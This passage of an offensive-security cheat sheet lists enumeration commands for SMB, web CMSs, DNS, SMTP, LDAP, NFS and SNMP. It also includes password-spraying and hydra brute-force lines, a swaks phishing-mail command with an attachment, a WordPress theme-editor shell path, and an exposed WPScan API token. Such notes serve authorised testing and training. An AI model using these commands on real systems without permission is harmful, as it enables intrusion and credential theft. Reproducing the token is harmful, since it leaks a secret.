</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">100</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-shares</span> <span class="c">#lists available shares</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">100</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-users</span> <span class="c">#lists users</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">100</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="p">-</span><span class="n">-all</span> <span class="c">#all information</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">100</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-p</span> <span class="mf">445</span> <span class="p">-</span><span class="n">-shares</span> <span class="c">#specific port</span>
</span></span><span class="line"><span class="cl"><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">100</span> <span class="n">-u</span> <span class="n">username</span> <span class="n">-p</span> <span class="n">password</span> <span class="n">-d</span> <span class="n">mydomain</span> <span class="p">-</span><span class="n">-shares</span> <span class="c">#specific domain</span>
</span></span><span class="line"><span class="cl"><span class="c">#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Smbclient</span>
</span></span><span class="line"><span class="cl"><span class="n">smbclient</span> <span class="n">-L</span> <span class="p">//</span><span class="n">IP</span> <span class="c">#or try with 4 /&#39;s</span>
</span></span><span class="line"><span class="cl"><span class="n">smbclient</span> <span class="p">//</span><span class="n">server</span><span class="p">/</span><span class="n">share</span>
</span></span><span class="line"><span class="cl"><span class="n">smbclient</span> <span class="p">//</span><span class="n">server</span><span class="p">/</span><span class="n">share</span> <span class="n">-U</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">smbclient</span> <span class="p">//</span><span class="n">server</span><span class="p">/</span><span class="n">share</span> <span class="n">-U</span> <span class="n">domain</span><span class="p">/</span><span class="n">username</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#SMBmap</span>
</span></span><span class="line"><span class="cl"><span class="n">smbmap</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">target_ip</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">smbmap</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">target_ip</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">smbmap</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">target_ip</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">smbmap</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">target_ip</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="n">-r</span> <span class="p">&lt;</span><span class="n">share_name</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Within SMB session</span>
</span></span><span class="line"><span class="cl"><span class="n">put</span> <span class="p">&lt;</span><span class="n">file</span><span class="p">&gt;</span> <span class="c">#to upload file</span>
</span></span><span class="line"><span class="cl"><span class="n">get</span> <span class="p">&lt;</span><span class="n">file</span><span class="p">&gt;</span> <span class="c">#to download file</span>
</span></span></code></pre></div><ul>
<li>Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mask</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">recurse</span> <span class="n">ON</span>
</span></span><span class="line"><span class="cl"><span class="n">prompt</span> <span class="n">OFF</span>
</span></span><span class="line"><span class="cl"><span class="n">mget</span> <span class="p">*</span>
</span></span></code></pre></div><h2 id="https-enumeration">HTTP/S enumeration</h2>
<ul>
<li>View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.</li>
<li>Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.</li>
<li>check /robots.txt folder</li>
<li>Look for the hostname and add the relevant one to <code>/etc/hosts</code> file.</li>
<li>Directory and file discovery - Obtain any hidden files that may contain juicy information</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">dirbuster</span>
</span></span><span class="line"><span class="cl"><span class="n">gobuster</span> <span class="nb">dir </span><span class="n">-u</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">example</span><span class="p">.</span><span class="py">com</span> <span class="n">-w</span> <span class="p">/</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">dirsearch</span><span class="p">.</span><span class="py">py</span> <span class="n">-u</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">example</span><span class="p">.</span><span class="py">com</span> <span class="n">-w</span> <span class="p">/</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">wordlist</span><span class="p">.</span><span class="py">txt</span>
</span></span></code></pre></div><ul>
<li>Vulnerability Scanning using nikto: <code>nikto -h &lt;url&gt;</code></li>
<li><code>HTTPS</code>SSL certificate inspection, may reveal information like subdomains, usernames…etc</li>
<li>Default credentials: Identify the CMS or service, check for default credentials, and test them out.</li>
<li>Bruteforce</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">hydra</span> <span class="n">-L</span> <span class="n">users</span><span class="p">.</span><span class="py">txt</span> <span class="n">-P</span> <span class="n">password</span><span class="p">.</span><span class="py">txt</span> <span class="p">&lt;</span><span class="n">IP</span> <span class="n">or</span> <span class="n">domain</span><span class="p">&gt;</span> <span class="n">http</span><span class="p">-{</span><span class="n">post</span><span class="p">/</span><span class="n">get</span><span class="p">}</span><span class="n">-form</span> <span class="s2">&#34;/path:name=^USER^&amp;password=^PASS^&amp;enter=Sign+in:Login name or password is incorrect&#34;</span> <span class="n">-V</span>
</span></span><span class="line"><span class="cl"><span class="c"># Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Bruteforce can also be done by Burpsuite but it&#39;s slow, prefer Hydra!</span>
</span></span></code></pre></div><ul>
<li>if <code>cgi-bin</code> is present, then do further fuzzing and obtain files like .sh or .pl</li>
<li>Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.</li>
<li>API - Fuzz further, and it can reveal some sensitive information</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#identifying endpoints using gobuster</span>
</span></span><span class="line"><span class="cl"><span class="n">gobuster</span> <span class="nb">dir </span><span class="n">-u</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">16</span><span class="err">:</span><span class="mf">5002</span> <span class="n">-w</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">dirb</span><span class="p">/</span><span class="n">big</span><span class="p">.</span><span class="py">txt</span> <span class="n">-p</span> <span class="n">pattern</span> <span class="c">#pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#obtaining info using curl</span>
</span></span><span class="line"><span class="cl"><span class="nb">curl </span><span class="n">-i</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="mf">16</span><span class="err">:</span><span class="mf">5002</span><span class="p">/</span><span class="n">users</span><span class="p">/</span><span class="n">v1</span>
</span></span></code></pre></div><ul>
<li>If there is any Input field check for <strong>Remote Code execution</strong> or <strong>SQL Injection</strong></li>
<li>Check the URL, whether we can leverage <strong>Local or Remote File Inclusion</strong>.</li>
<li>Also check if there’s any file upload utility(also obtain the location it’s getting reflected)</li>
</ul>
<h3 id="wordpress">Wordpress</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># basic usage</span>
</span></span><span class="line"><span class="cl"><span class="n">wpscan</span> <span class="p">-</span><span class="n">-url</span> <span class="s2">&#34;target&#34;</span> <span class="p">-</span><span class="n">-verbose</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># enumerate vulnerable plugins, users, vulnerable themes, timthumbs</span>
</span></span><span class="line"><span class="cl"><span class="n">wpscan</span> <span class="p">-</span><span class="n">-url</span> <span class="s2">&#34;target&#34;</span> <span class="p">-</span><span class="n">-enumerate</span> <span class="n">vp</span><span class="p">,</span><span class="n">u</span><span class="p">,</span><span class="n">vt</span><span class="p">,</span><span class="n">tt</span> <span class="p">-</span><span class="n">-follow-redirection</span> <span class="p">-</span><span class="n">-verbose</span> <span class="p">-</span><span class="n">-log</span> <span class="n">target</span><span class="p">.</span><span class="py">log</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Add Wpscan API to get the details of vulnerabilties.</span>
</span></span><span class="line"><span class="cl"><span class="n">wpscan</span> <span class="p">-</span><span class="n">-url</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="nb">alvida-eatery</span><span class="p">.</span><span class="n">org</span><span class="p">/</span> <span class="p">-</span><span class="n">-api-token</span> <span class="n">NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Accessing Wordpress shell</span>
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">67</span><span class="p">.</span><span class="mf">245</span><span class="p">/</span><span class="n">retro</span><span class="p">/</span><span class="nb">wp-admin</span><span class="p">/</span><span class="nb">theme-editor</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">file</span><span class="p">=</span><span class="mf">404</span><span class="p">.</span><span class="n">php</span><span class="p">&amp;</span><span class="n">theme</span><span class="p">=</span><span class="n">90s-retro</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">67</span><span class="p">.</span><span class="mf">245</span><span class="p">/</span><span class="n">retro</span><span class="p">/</span><span class="nb">wp-content</span><span class="p">/</span><span class="n">themes</span><span class="p">/</span><span class="n">90s-retro</span><span class="p">/</span><span class="mf">404</span><span class="p">.</span><span class="py">php</span>
</span></span></code></pre></div><h3 id="drupal">Drupal</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">droopescan scan drupal -u http://site
</span></span></code></pre></div><h3 id="joomla">Joomla</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">droopescan scan joomla --url http://site
</span></span><span class="line"><span class="cl">sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username <span class="c1">#https://github.com/ajnik/joomla-bruteforce </span>
</span></span></code></pre></div><h2 id="dns-enumeration">DNS enumeration</h2>
<ul>
<li>Better use <code>Seclists</code> wordlists for better enumeration. <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS">https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS</a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">host</span> <span class="n">www</span><span class="p">.</span><span class="py">megacorpone</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="n">-t</span> <span class="n">mx</span> <span class="n">megacorpone</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="n">-t</span> <span class="n">txt</span> <span class="n">megacorpone</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="vm">$</span><span class="p">(</span><span class="nb">cat </span><span class="n">list</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span> <span class="k">do</span> <span class="n">host</span> <span class="nv">$ip</span><span class="p">.</span><span class="py">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">;</span> <span class="n">done</span> <span class="c">#DNS Bruteforce</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="vm">$</span><span class="p">(</span><span class="n">seq</span> <span class="mf">200</span> <span class="mf">254</span><span class="p">);</span> <span class="k">do</span> <span class="n">host</span> <span class="mf">51.222</span><span class="p">.</span><span class="py">169</span><span class="p">.</span><span class="nv">$ip</span><span class="p">;</span> <span class="n">done</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">-v</span> <span class="s2">&#34;not found&#34;</span> <span class="c">#bash bruteforcer to find domain name</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">## DNS Recon</span>
</span></span><span class="line"><span class="cl"><span class="n">dnsrecon</span> <span class="n">-d</span> <span class="n">megacorpone</span><span class="p">.</span><span class="py">com</span> <span class="n">-t</span> <span class="n">std</span> <span class="c">#standard recon</span>
</span></span><span class="line"><span class="cl"><span class="n">dnsrecon</span> <span class="n">-d</span> <span class="n">megacorpone</span><span class="p">.</span><span class="py">com</span> <span class="n">-D</span> <span class="p">~/</span><span class="n">list</span><span class="p">.</span><span class="py">txt</span> <span class="n">-t</span> <span class="n">brt</span> <span class="c">#bruteforce, hence we provided list</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># DNS Bruteforce using dnsenum</span>
</span></span><span class="line"><span class="cl"><span class="n">dnsenum</span> <span class="n">megacorpone</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">## NSlookup, a gold mine</span>
</span></span><span class="line"><span class="cl"><span class="n">nslookup</span> <span class="n">mail</span><span class="p">.</span><span class="py">megacorptwo</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl"><span class="n">nslookup</span> <span class="n">-type</span><span class="p">=</span><span class="n">TXT</span> <span class="n">info</span><span class="p">.</span><span class="py">megacorptwo</span><span class="p">.</span><span class="py">com</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="py">151</span> <span class="c">#We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful</span>
</span></span></code></pre></div><h2 id="smtp-enumeration">SMTP enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">nc</span> <span class="n">-nv</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="mf">25</span> <span class="c">#Version Detection</span>
</span></span><span class="line"><span class="cl"><span class="nb">smtp-user</span><span class="n">-enum</span> <span class="n">-M</span> <span class="n">VRFY</span> <span class="n">-U</span> <span class="n">username</span><span class="p">.</span><span class="py">txt</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="c"># -M means mode; it can be RCPT, VRFY, EXPN</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#Sending email with valid credentials, the below is an example of Phishing mail attack</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">swaks</span> <span class="n">-t</span> <span class="n">daniela</span><span class="nv">@beyond</span><span class="p">.</span><span class="py">com</span> <span class="n">-t</span> <span class="n">marcus</span><span class="nv">@beyond</span><span class="p">.</span><span class="py">com</span> <span class="p">-</span><span class="n">-from</span> <span class="n">john</span><span class="nv">@beyond</span><span class="p">.</span><span class="py">com</span> <span class="p">-</span><span class="n">-attach</span> <span class="nv">@config</span><span class="p">.</span><span class="nb">Library-ms</span> <span class="p">-</span><span class="n">-server</span> <span class="mf">192.168</span><span class="p">.</span><span class="py">50</span><span class="p">.</span><span class="py">242</span> <span class="p">-</span><span class="n">-body</span> <span class="nv">@body</span><span class="p">.</span><span class="py">txt</span> <span class="p">-</span><span class="n">-header</span> <span class="s2">&#34;Subject: Staging Script&#34;</span> <span class="p">-</span><span class="n">-suppress-data</span> <span class="n">-ap</span>
</span></span></code></pre></div><h2 id="ldap-enumeration">LDAP Enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span><span class="err">:</span><span class="p">&lt;</span><span class="n">port</span><span class="p">&gt;</span> <span class="c"># try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c">#CN name describes the info we&#39;re collecting</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ldapsearch</span> <span class="n">-x</span> <span class="n">-H</span> <span class="n">ldap</span><span class="err">:</span><span class="p">//&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-D</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;username&gt;&#39;</span> <span class="n">-w</span> <span class="s1">&#39;&lt;password&gt;&#39;</span> <span class="n">-b</span> <span class="s2">&#34;CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#windapsearch.py</span>
</span></span><span class="line"><span class="cl"><span class="c">#for computers</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">windapsearch</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">IP</span> <span class="n">address</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-computers</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#for groups</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">windapsearch</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">IP</span> <span class="n">address</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-groups</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#for users</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">windapsearch</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">IP</span> <span class="n">address</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-da</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#for privileged users</span>
</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">windapsearch</span><span class="p">.</span><span class="py">py</span> <span class="p">-</span><span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">IP</span> <span class="n">address</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-privileged-users</span>
</span></span></code></pre></div><h2 id="nfs-enumeration">NFS Enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="n">-sV</span> <span class="p">-</span><span class="n">-script</span><span class="p">=</span><span class="nb">nfs-showmount</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">showmount</span> <span class="n">-e</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="snmp-enumeration">SNMP Enumeration</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#Nmap UDP scan</span>
</span></span><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-A</span> <span class="n">-T4</span> <span class="n">-p</span><span class="p">-</span> <span class="n">-sU</span> <span class="n">-v</span> <span class="n">-oN</span> <span class="nb">nmap-udpscan</span><span class="p">.</span><span class="py">txt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">snmpcheck</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="n">public</span> <span class="c">#Better version than snmpwalk as it displays more user friendly</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">-t</span> <span class="mf">10</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="c">#Displays entire MIB tree, MIB Means Management Information Base</span>
</span></span><span class="line"><span class="cl"><span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">4</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">77</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">25</span> <span class="c">#Windows User enumeration</span>
</span></span><span class="line"><span class="cl"><span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">4</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span> <span class="c">#Windows Processes enumeration</span>
</span></span><span class="line"><span class="cl"><span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="mf">1.3</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">25</span><span class="p">.</span><span class="py">6</span><span class="p">.</span><span class="py">3</span><span class="p">.</span><span class="py">1</span><span class="p">.</span><span class="py">2</span> <span class="c">#Installed software enumeraion</span>
